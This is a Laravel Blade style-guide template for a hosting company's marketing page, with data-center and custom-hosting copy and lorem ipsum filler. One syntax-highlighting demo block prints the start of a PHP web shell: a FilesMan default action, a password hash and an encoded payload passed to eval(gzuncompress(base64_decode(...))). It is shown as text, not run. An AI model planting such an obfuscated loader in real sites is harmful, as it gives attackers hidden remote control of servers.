@section('title', 'Style Guide')

@section('body_class', 'style-guide')

@section('page-styles')
  <link href="/css/vendor/prism.css" rel="stylesheet" />
@endsection

@section('page-js-files')
  <script defer src="/js/vendor/prism.js"></script>
@endsection

@extends('layouts.app')

@section('content')
  @component('components.hero')
    @slot('pageTitle')
      Hosting
    @endslot
    @slot('pageSubtitle')
      Lorem ipsum dolor sit amet, consectetur
    @endslot
    @slot('pageShortDescription')
      Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin velit ante, bibendum eu consectetur non, accumsan ut orci. Maecenas velit nibh, imperdiet.
    @endslot
  @endcomponent

  {{ Breadcrumbs::render('style-guide') }}

  <div class="container">
    <div class="row">
      <div class="col-md-12">
        <h2 class="extend">Downtown Kansas City Data Center</h2>

        <p class="leader">
          With over 20 years of experience in hosting we have learned how to do it right. Not only for companies, but for developers too. As we are developers by nature we crafted our hosting solutions to support today's but be flexible enough embrace tomorrows.
        </p>

        <p>
          Our downtown Kansas City location is a Tier II data center with over 11000 square feet of floor space. Oak Tower is one of the key Fiber transit buildings for Kansas City. Originally, the building housed the AT&T Central Office for the entire Kansas City Metro area. Today, this building is home to Verizon, American Fiber Systems, Cogent Communications and several other key transit and telecommunications infrastructure providers.
        </p>
      </div>
    </div>

    <div class="row equalize">
      <div class="col-md-4 service">
        @component('components.service')
          @slot('title')
            Custom
          @endslot
          @slot('description')
            <p>
              PHP the way it was meant to be run. It is faster with php-fpm and allows us to provide virtually any version of PHP that you could want. With the exception of PHP 4 (Not true, we do have it, but like the language the server is really, really old).
            </p>
          @endslot
          @slot('learnMore')
            {{ route('hosting.custom') }}
          @endslot
        @endcomponent
      </div>

      <div class="col-md-4 service">
        @component('components.service')
          @slot('title')
            Cloud
          @endslot
          @slot('description')
            <p>
              Not all companies need email as it might already be in the cloud. If you need it or want to migrate it, we have a solution. From straight up POP/IMAP to Google Apps or Office 365.
            </p>
          @endslot
        @endcomponent
      </div>

      <div class="col-md-4 service">
        @component('components.service')
          @slot('title')
            Colocated
          @endslot
          @slot('description')
            <p>
              Not sure how to make the move? We can do it for you. Regardless of your current hosting platform we can tailor a solution to support your current services.
            </p>
            <p>
              Our Migration services offer a painless way to make a switch from your current provider.
            </p>
          @endslot
        @endcomponent
      </div>
    </div>

    <div class="row theme equalize">
      <div class="col-md-6">
        <div class="left light-grey">
          <h2 class="extend">
            The Opposite of cPanel
          </h2>
          <p class="leader">
            If you just need hosting, then get just hosting?
          </p>
          <p>
            Not sure how to make the move? We can do it for you. Regardless of your current hosting platform we can tailor a solution to support your current services.
          </p>
          <p>
            Our Migration services offer a painless way to make a switch from your current provider.
          </p>
        </div>
      </div>
    </div>

    <div class="row theme equalize">
      <div class="col-md-6">
        <div class="column left light-grey">
          <h2 class="extend">
            Q: What gives, your website L
          </h2>
        </div>
      </div>
    </div>

    <div class="row theme equalize">
      <div class="col-md-6">
        <div class="column left light-grey">
          <h2 class="extend">The Opposite of cPanel</h2>

          <p class="leader">

          </p>

          <p>
            This is what Custom Hosting is. It focuses on the services needed to power your website or application, not the interface to manage it. How many times have you gone in to optimize your hosting solution? Probably never, and most likely don't want too, that is what we are for.
          </p>

          <p>
            Most hosting companies only use cPanel for their hosting solution, which limits them to what it offers. If they want new features they have to wait for an upgrade. We don't.
          </p>

          <p>
            cPanel is recommended if it is the right solution for the task at hand. If not, then our Custom Hosting provides us the flexiblity for most any need.
          </p>
        </div>
      </div>

      <div class="col-md-3">
        <div class="column middle dark-grey">
          <h2 class="extend">Distributed</h2>

          <p class="leader">
            Dedicated servers for each core component.
          </p>

          <p>
            While cPanel has everything under one roof, our custom hosting provides dedicated servers for each core component of your website or application.
          </p>

          <p>
            With servers that specialize in one thing, your website or application will function at peak performance.
          </p>
        </div>
      </div>

        <div class="col-md-3">
          <div class="column right light-blue">
            <h2 class="extend">Linux or Win</h2>

            <p class="leader">
              Your not limited to just Linux with our Custom Hosting.
            </p>

            <p>
              Heck, you can have both.
            </p>

            <p>
              With either operating system we can customize your webserver configuration and support custom applications that drive your business.
            </p>
        </div>
      </div>
    </div>

    <div class="row theme equalize">
      <div class="col-md-4">
        <div class="column left light-blue">
          <h2 class="extend">The Opposite of cPanel</h2>

          <p class="leader">
            If you just need hosting, then get just hosting?
          </p>

          <p>
            This is what Custom Hosting is. It focuses on the services needed to power your website or application, not the interface to manage it. How many times have you gone in to optimize your hosting solution? Probably never, and most likely don't want too, that is what we are for.
          </p>

          <p>
            Most hosting companies only use cPanel for their hosting solution, which limits them to what it offers. If they want new features they have to wait for an upgrade. We don't.
          </p>

          <p>
            cPanel is recommended if it is the right solution for the task at hand. If not, then our Custom Hosting provides us the flexiblity for most any need.
          </p>
        </div>
      </div>

      <div class="col-md-4">
        <div class="column middle light-grey">
          <h2 class="extend">Distributed</h2>

          <p class="leader">
            Dedicated servers for each core component.
          </p>

          <p>
            While cPanel has everything under one roof, our custom hosting provides dedicated servers for each core component of your website or application.
          </p>

          <p>
            With servers that specialize in one thing, your website or application will function at peak performance.
          </p>
        </div>
      </div>

      <div class="col-md-4">
        <div class="column right dark-grey">
          <h2 class="extend">Linux or Win</h2>

          <p class="leader">
            Your not limited to just Linux with our Custom Hosting.
          </p>

          <p>
            Heck, you can have both.
          </p>

          <p>
            With either operating system we can customize your webserver configuration and support custom applications that drive your business.
          </p>
        </div>
      </div>
    </div>

    <div class="row theme equalize">
      <div class="col-md-8">
        <div class="column left light-grey">
          <h2 class="extend">Q: What gives, your website is Drupal</h2>

          <blockquote>
            A: Yes, yes it is.
          </blockquote>
        </div>
      </div>

      <div class="col-md-4">
        <div class="column right">
<pre><code class="language-php line-numbers">remove_action( 'genesis_loop', 'genesis_do_loop' );

require CHILD_DIR . '/lib/portfolio_navigation.inc.php';
add_action( 'genesis_loop', 'acme_portfolio_page' );

function acme_portfolio_page() {
	$type = 'portfolio';
	$args=array(
		'post_type' => $type,
		'post_status' => 'publish',
		'posts_per_page' => -1,
		'caller_get_posts'=> 1,
		'orderby'=> 'ID',
		'order'=> 'DESC'
		);

	$my_query = null;
	$my_query = new WP_Query($args);

	if( $my_query->have_posts() ) {
</code></pre>
        </div>
      </div>
    </div>

    <div class="row theme equalize">
      <div class="col-md-6">
        <div class="column left light-grey">
          <h2 class="extend">Q: What gives, your website is D</h2>

          <blockquote>
            A: Yes, yes it is.
          </blockquote>

          <p>
            Years ago (several) when every website we did was built on our custom frameword (and these CMS things started popping up) we decided to evaluate serveral content management systems (Joomla, Drupal, WordPress, DotNetNuke and several others). It all came down to the developer evaluating Drupal did it with our website, no reason or time to do it again.
          </p>
        </div>
      </div>

      <div class="col-md-6">
        <div class="column right light-blue">
          <h2 class="extend">Q: Do you have a preference?</h2>

          <blockquote>
            A: No. Choose the right tool for the job.
          </blockquote>

          <p>
            You don't get a screw out with pliers (well you can if you don't have a screwdriver or as a last resort). Each project is differnent. Some might require a CMS, some might not.
          </p>

          <p>
            For us to say one solution is right for everything would mean that we don't know what we are doing.
          </p>
        </div>
      </div>
    </div>

    <div class="row theme">
      <div class="col-md-6">
        <div class="column left light-grey">
          <h2 class="extend">Q: What gives, your website is D</h2>
        </div>
      </div>
    </div>

    <div class="row theme equalize">
      <div class="col-md-8">
        <div class="column left light-grey">
          <h2 class="extend">Q: What gives, your website is Drupal</h2>

          <blockquote>
            A: Yes, yes it is.
          </blockquote>
        </div>
      </div>

      <div class="col-md-4">
        <div class="column right">
<pre><code class="language-php line-numbers">$auth_pass = "63a9f0ea7bb98050796b649e85481845";
$color = "#df5";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'Windows-1251';
$xYEzDu6r3EZT="GR5yYXp3YH17ejRne3h9cGdgdWBxPDB5dX9xYWQ9NG8ZHjQ0NDQweHt4NCk0MzMvG
R40NDQ0cntmPDB9KSQvMH00KDRnYGZ4cXo8MHl1f3FhZD0vMH0/KSY9NG8ZHjQ0NDQ0NDB4e3g6KXd8Z
jx8cWxwcXc8Z2F2Z2BmPDB5dX9xYWQ4MH04Jj09PS8ZHjQ0NDRpGR40NDQ0ZnFgYWZ6NDB4e3gvGR5pG
yJyIiAiISYsIXUhLCF1IiwiJiAnIiwicSIhInAidyMhIXUicCMsIiwiICAjISEiciEtInAgIiN1IXUhI
CEtJyQhLCcmISYidyEtJyYnLSJ2IXUhJyIjInEgcSEjIC0jLCByISMhdScgIichICBwIyMiJSJ2ISUnI
yMgInAiJSMtJy0hJCEtISMgcSB2IScnJicsJyEhJiJ2IncgLCImI3UgIiAsIiYjdSJ3IC0hJyEhIicnJ
SEtInciIyN1IS0nJiMgI3UiICJwInYnJiEjICwhIiMsIXUidSIgIHYgdiMtJywjdSEiICwicicnIS0id
iMjJyAgdyckJywjdSImInciLCElIHEgIyAiJyYgcSN1IncgcSEjICcjJyMjISMicCcgJyEiJyAiIXUgd
iIlICAgcCchISMhIiJ2IyIhJScmJyEgciEnISwjJCJ2IHIgISctIyEhJycmJyEidSEtJyUhJiIsIiEid

eval(gzuncompress(base64_decode($xYEzDu6r3EZT)));
</code></pre>
        </div>
      </div>
    </div>

    <div class="row theme equalize">
      <div class="col-md-6">
        <div class="column left light-grey">
          <h2 class="extend">Q: What gives, your website is D</h2>

          <blockquote>
            A: Yes, yes it is.
          </blockquote>

          <p>
            Years ago (several) when every website we did was built on our custom frameword (and these CMS things started popping up) we decided to evaluate serveral content management systems (Joomla, Drupal, WordPress, DotNetNuke and several others). It all came down to the developer evaluating Drupal did it with our website, no reason or time to do it again.
          </p>
        </div>
      </div>

      <div class="col-md-6">
        <div class="column right dark-grey">
          <h2 class="extend">Q: Do you have a preference?</h2>

          <blockquote>
            A: No. Choose the right tool for the job.
          </blockquote>

          <p>
            You don't get a screw out with pliers (well you can if you don't have a screwdriver or as a last resort). Each project is differnent. Some might require a CMS, some might not.
          </p>

          <p>
            For us to say one solution is right for everything would mean that we don't know what we are doing.
          </p>
        </div>
      </div>
    </div>

    <div class="row theme equalize">
      <div class="col-md-6">
        <div class="column left white no-extend">
          <h2 class="extend">The Opposite of cPanel</h2>

          <p class="leader">
            If you just need hosting, then get just hosting?
          </p>

          <p>
            This is what Custom Hosting is. It focuses on the services needed to power your website or application, not the interface to manage it. How many times have you gone in to optimize your hosting solution? Probably never, and most likely don't want too, that is what we are for.
          </p>

          <p>
            Most hosting companies only use cPanel for their hosting solution, which limits them to what it offers. If they want new features they have to wait for an upgrade. We don't.
          </p>

          <p>
            cPanel is recommended if it is the right solution for the task at hand. If not, then our Custom Hosting provides us the flexiblity for most any need.
          </p>
        </div>
      </div>

      <div class="col-md-6">
        <div class="column right white no-extend">
          <h2 class="extend">The Opposite of cPanel</h2>

          <p class="leader">
            If you just need hosting, then get just hosting?
          </p>

          <p>
            This is what Custom Hosting is. It focuses on the services needed to power your website or application, not the interface to manage it. How many times have you gone in to optimize your hosting solution? Probably never, and most likely don't want too, that is what we are for.
          </p>

          <p>
            Most hosting companies only use cPanel for their hosting solution, which limits them to what it offers. If they want new features they have to wait for an upgrade. We don't.
          </p>

          <p>
            cPanel is recommended if it is the right solution for the task at hand. If not, then our Custom Hosting provides us the flexiblity for most any need.
          </p>
        </div>
      </div>
    </div>

    <div class="row theme equalize">
      <div class="col-md-3">
        <div class="column left no-extend">
          <h3 class="extend">Developer Tools</h3>

          <p>
            It’s your server. It’s fully customizable with SSH and root access. The powerful Webmin interface gives you control of advanced functionality with a clean user interface.
          </p>
        </div>
      </div>

      <div class="col-md-3">
        <div class="column middle no-extend">
          <h3 class="extend">php-fpm</h3>

          <p>
            PHP the way it was meant to be run. It is faster with php-fpm and allows us to provide virtually any version of PHP that you could want. With the exception of PHP 4 (Not true, we do have it, but like the language the server is really, really old).
          </p>
        </div>
      </div>

      <div class="col-md-3">
        <div class="column middle no-extend">
          <h3 class="extend">Email</h3>

          <p>
            Not all companies need email as it might already be in the cloud. If you need it or want to migrate it, we have a solution. From straight up POP/IMAP to Google Apps or Office 365.
          </p>
        </div>
      </div>

      <div class="col-md-3">
        <div class="column right no-extend">
          <h3 class="extend">Migration</h3>

          <p>
            Not sure how to make the move? We can do it for you. Regardless of your current hosting platform we can tailor a solution to support your current services.
          </p>

          <p>
            Our <a href="">Migration</a> services offer a painless way to make a switch from your current provider.
          </p>
        </div>
      </div>
    </div>

    <div class="row theme">
      <div class="col-md-12">
        <div class="column dark-grey call-to-action">
          <h2>Need a Custom Hosting? Tell us what your looking for.</h2>

          <p>
            Take a minute to fill out our custom hosting survey so that we can identify your needs.
          </p>

          <a href="/websites-and-apps/website/questionnaire" class="button rounded">Tell Us About Your Hosting</a>
        </div>
      </div>
    </div>
  </div>
@endsection
